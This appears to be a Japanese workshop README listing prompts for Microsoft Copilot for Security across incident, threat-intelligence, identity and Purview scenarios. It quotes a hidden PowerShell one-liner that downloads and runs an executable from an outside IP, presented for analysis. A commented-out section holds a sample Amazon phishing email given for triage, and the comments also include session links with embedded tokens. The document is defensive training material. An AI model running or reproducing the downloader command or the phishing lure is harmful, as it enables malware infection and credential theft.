![Security CoPilot Logo](https://github.com/ninjyanaka/Copilot-For-Security/blob/main/Promptbook%20samples/ic_fluent_copilot_64_64%402x.png)
# Microsoft Copilot for Security Workshop


https://securitycopilot.microsoft.com/

ポータルサイト一覧：
[Copilot for Security](https://securitycopilot.microsoft.com/)
&nbsp;
[Microsoft Defender XDR Portal](https://security.microsoft.com/)
&nbsp;
[Microsoft Purview Portal](https://purview.microsoft.com/)
&nbsp;
[本日の資料](https://livesend.microsoft.com/i/CsvQyuCoFtM43uTUGr7armKzd6y3Q2LN4ZZPLUSSIGNWHgVIB1wILQ9wiaxuFrLhAzNNRb2V4les7hWUol49znccjs9J___14EnKBRUDavPwyL0BMFjgyMEkGHJ8___WBZgxhz84St___)

***
&nbsp;
## ハンズオンシナリオ➁ インシデント分析編

```
Microsoft Defender XDRから、優先すべき重大度の高いインシデントの Top 5 を教えて
```
```
Defender インシデント 4078 について教えて
```
```
Defender インシデント 4078 について300文字で日本語で要約して
```
```
このインシデントに関連するすべてのエンティティを特定し、抽出して
```
```
MDTIを使用して、IPアドレス、URLとファイルのハッシュを検証し、レピュテーションを評価して
```
```
VirusTotal を使用して、このIPアドレス 101.35.198.64 のレピュテーションスコアを教えて
```
```
このインシデントを解決するためのアクションプランを教えて
```
```
このインシデントから得られた主な洞察をまとめたエグゼクティブレポートを作成してください。レポートに続いて、特定されたリスクに対処するために修正が必要な主な領域を箇条書きでリストアップしてください。最後に、これらの懸念事項に対処するための緩和策の概要を説明してください。
```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/cf3e1f76-9b48-4f3f-bae7-62bf60673b53?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMTU3ZjkzMDItYTY4MC00NzczLWFiN2EtOWQ4OTcyNDY1M2ViIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImNmM2UxZjc2LTliNDgtNGYzZi1iYWU3LTYyYmY2MDY3M2I1MyIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYxOTg2LCJleHAiOjIwNDUxOTQ3ODYsImlhdCI6MTcyOTY2MTk4NiwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.12AlcahmELWfdooT9zJ8laDLKfq6Z2jSxXBz-1xCmKo)
-->

***
&nbsp;
## ハンズオンシナリオ➁　スクリプト分析編

 ```
以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
 ```
```
MDTIを使用して、検出されたIPアドレスまたはドメイン、ホスト名を検証し、レピュテーションを評価して
```
```
この分析結果を要約してエグゼクティブレポートを作成する。スクリプトの評価から始める。評価に対する信頼性と裏付けとなる証拠を含める。その下に、「スクリプトの概要」、「脅威インテリジェンス」、「対応の提案」の各セクションを設ける。技術的でない読者にも適した内容にする
```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/7fd4c1dc-ed79-4744-b255-8fae70757085?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiNGI0OGE3MWItZTBlNi00MWEwLTk2NDUtYWNmYmZiZDIyOWIwIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjdmZDRjMWRjLWVkNzktNDc0NC1iMjU1LThmYWU3MDc1NzA4NSIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwMjc4LCJleHAiOjIwNDUxOTMwNzgsImlhdCI6MTcyOTY2MDI3OCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.xotnp07qH2ltTEQF2oIo6DbNe68W_jLw6XzOTcFDx-g)
-->
&nbsp;
***
&nbsp;
## ハンズオンシナリオ➁　脅威インテリジェンス編

その１
```
過去1ヶ月間で、私の組織を標的とした最新の脅威の概要を日本語で教えて
 ```
```
CVE-2024-47176 について、および技術的な知識があまりない人向けの内容で教えて
```
```
私のエンドポイントは CVE-2024-47176  に対して脆弱ですか？
```
```
このCVEから組織を守るためには、どのような緩和策を講じることができますか
```
```
脆弱性、脅威要因に関する洞察、および技術的な知識があまりない人向けの推奨事項に関するエグゼクティブ・サマリー・レポートを書いてください
```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/4eb6202b-3b8b-46bf-af30-cb629e137e93?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMjBhMWU5MjctMjAxMC00ZTYxLTgxMTYtYjQ4YmMwOWU2NDA3IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjRlYjYyMDJiLTNiOGItNDZiZi1hZjMwLWNiNjI5ZTEzN2U5MyIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwNTU3LCJleHAiOjIwNDUxOTMzNTcsImlhdCI6MTcyOTY2MDU1NywiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.x0Uj_SI6UE_pBu3h--c8cU9eSWlFz0QJAzkyJIRGgjo)
-->

その２
 ```
CVE-2024-3400について教えて
 ```
 ```
この脆弱性の影響を受けやすい技術を箇条書きで挙げてく
 ```
 ```
このCVEから組織を守るためには、どのような緩和策を講じることができますか
 ```
 ```
Query:A社利用のSW一覧 FileNames: AnswerInstructions:該当の脆弱性の対象のソフトウェアは含まれていますか？
 ```
 ```
脆弱性、脅威要因に関する洞察、および技術的な知識があまりない人向けの推奨事項に関するエグゼクティブ・サマリー・レポートを書いてください
 ```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/e860514f-78f8-42e5-acdc-86bee81f3dbf?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMTM0ZDBjMWItZGE1ZS00ZjM3LTgwMWUtYWNlZjVhNjc0ZTBhIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImU4NjA1MTRmLTc4ZjgtNDJlNS1hY2RjLTg2YmVlODFmM2RiZiIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwOTY0LCJleHAiOjIwNDUxOTM3NjQsImlhdCI6MTcyOTY2MDk2NCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.r0twuMTFDzQsYClPHz7M3xMh0_Sd1pZ-pM7bsv-5wpU)
-->

その３
 ```
私はセキュリティエンジニアです。攻撃アクターグループ Midnight Blizzard について教えて
 ```

***
&nbsp;
## ハンズオンシナリオ➂　ナレッジベース（Azure AI Search、ファイル）

ファイル
```
CVE-2024-3400について教えて
```
 ```
Query:A社利用のSW一覧 FileNames: AnswerInstructions:該当の脆弱性の対象のソフトウェアは含まれていますか？
 ```

AI Search
```
Azure AI Search を使用して、インシデントの対応手順を教えて
```
```
Azure AI Search を使用して、どのようなタイプのウィルスがあるか教えて
```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/daca16ce-ef6b-417a-9430-10774a64be32?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMDAxNmZkYjMtYThkZi00ZWIwLWFhNzUtMjhiMjAwMTFkNTc3IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImRhY2ExNmNlLWVmNmItNDE3YS05NDMwLTEwNzc0YTY0YmUzMiIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwOTkxLCJleHAiOjIwNDUxOTM3OTEsImlhdCI6MTcyOTY2MDk5MSwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.SG0bSNbJGHdKjVcuCd1wGgS3rpLiRkjTpGf7u88ENDA)
-->
***
&nbsp;
## ハンズオンシナリオ➂　アドバンスドハンティング　KQL

```
NL2KQL for Defender を使用して、エンドポイントからIPv4アドレスの 101.35.198.64 への通信教えて
```

***
&nbsp;

***
&nbsp;
## ハンズオンシナリオ➃　Entra

```
ユーザー test01@MngEnvMCAP616855.onmicrosoft.com について教えて
```
```
このユーザーに関連付けられているデバイスは何ですか？
```
```
このユーザーに対してどのような認証方法が有効になっていますか？
```
```
このユーザーのIdentity Summaryを見せて
```
```
NL2KQL for Sentinel を使用して,SigninLogsから "UPN" のSign-in ログ見せて
```
```
Purviewを使用して、このユーザーの活動を教えて
```
```
潜在的なリスクのあるユーザーに関する洞察をまとめたエグゼクティブレポートを作成します。まず、ユーザーのメタデータの詳細から始めます。これには、ユーザーのユーザー・プリンシパル名（UPN）、疑わしい国、設定された認証方法、日本語で記録されたログイン試行の失敗などが含まれます。次に、特定されたリスクに対処するために修正が必要な主な領域を箇条書きで示します。その後、日本語で、強調された懸念事項を改善するための緩和策を説明した一貫性のある段落を作成します
```
<!--
[Session link](https://securitycopilot.microsoft.com/sessions/42640117-6a57-454d-b448-ae044d8d33d7?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiNDU4MzIwZTEtYWRmYS00N2JlLWJiOTMtNjlmOTg2NDcwOTAyIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjQyNjQwMTE3LTZhNTctNDU0ZC1iNDQ4LWFlMDQ0ZDhkMzNkNyIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYxOTA0LCJleHAiOjIwNDUxOTQ3MDQsImlhdCI6MTcyOTY2MTkwNCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.eKOXsBiQlk2-bdwnFwkqEvuEN8SdtLTlJ_l6VJSAnEw)
-->
***
&nbsp;
## ハンズオンシナリオ➃　Purview

```
Microsoft Purview から、優先すべき重大度の高いアラートの上位5件を教えて
```
```
アラートID　dl13063524-3948-d713-2a00-08dcbd250086　について教えて
```
```
調査結果をエグゼクティブ・レポートにまとめて
```
<!-- 
[Session link](https://securitycopilot.microsoft.com/sessions/aa67d492-183a-4f52-961b-ceca51d406f2?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiMWUzMDc2NDEtMTM4Ny00NGFjLTk4YjAtOWQ2MTQ3N2Y5MWY5IiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6ImFhNjdkNDkyLTE4M2EtNGY1Mi05NjFiLWNlY2E1MWQ0MDZmMiIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwNzgyLCJleHAiOjIwNDUxOTM1ODIsImlhdCI6MTcyOTY2MDc4MiwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.Bs9BAWn7gv5REr2ORrZqlC-Laq7V_ICqRMtW_wwVyjo)
-->
***
&nbsp;
## ハンズオンシナリオ➄ Logic Apps - Email 分析
<!--

```
/AskGPT Triage the following email and point out what you find suspicious?. Ignore this URL https://security.microsoft.com/userSubmissionsReportMessage. Investigate the Message-ID for any inconsistencies or signs of spoofing. Use inputs: email body:



--------------------------------------------------------------------------------

差出人: Amazon <anoma@mlkij.top>
送信日時: 2024年9月21日 22:09
宛先: hiro77_naka <hiro77_naka@hotmail.com>
件名: Amazon.co.jp にご登録のアカウント（名前、パスワード、その他個人情報）の確認 21:09:25
 
Amazon.co.jp にご登録のアカウント（名前、パスワード、その他個人情報）の確認...



 

   

 Аmazon
お[\""http://g-ec2.images-amazon.com/images/G/01/e-mail/logos/a_jp_prime_logo_48.gif\""]客様 



残念ながら、あなたのアカウント



Аmazon を更新できませんでした。
これは、カードが期限切れになったか。請求先住所が変更されたなど、さまざまな理由で発生する可能性があります。





アカウント情報の一部が誤っている故に、お客様のアカウントを維持するため





Аmazon 情報を確認する必要・ェあります。今アカウントを確認できます。
Аmazon ログイン [\""https://nmo.knamo.top/\""]



なお、72時間以内にご確認がない場合、誠に遺憾ながら、アカウントをロックさせていただくことを警告いたします。






お知らせ:
 * パスワードは誰にも教えないでください。
   
   

 * 個人情報と関係がなく、推測しにくいパスワードを作成してください。大文字と小文字、数字、および記号を必ず使用してください。
   
   

 * ネットワーク転送のため、本メールはごみ箱にあるかもしれません。信頼してリンクを開けてください。


どうぞよろしくお願いいたします。




Аmazon
 

 , sender emailLhiro77_naka@hotmail.com, reciver email:admin@MngEnvMCAP616855.onmicrosoft.com, messageId:<OSZPR01MB67528EEFCCA1BC47F1109A4D897F2@OSZPR01MB6752.jpnprd01.prod.outlook.com>, emailSubject:調査依頼 Fw: Amazon.co.jp にご登録のアカウント（名前、パスワード、その他個人情報）の確認 21:09:25,Email receivedDateTime:2024-10-09T01:19:44+00:00, importance:normal
```
```
elaborate more on the entities?
```
```
Using MDTI, Return the reputation for all the domains and IP addresses in the e-mail.
```
```
Using Virus Total Reports,  If a URL link is included, please give me the report for this URL.
```
```
The above is research conducted by a security analyst to determine if an email is a phishing attempt. Summaries and share all steps of this research to determine if the email is a phishing email in Japanese. Share the confidence percentages: 0-30% if the email is not suspicious, 30%-74% if it is moderately suspicious and 75%-100% if it is highly suspicious.
```
-->
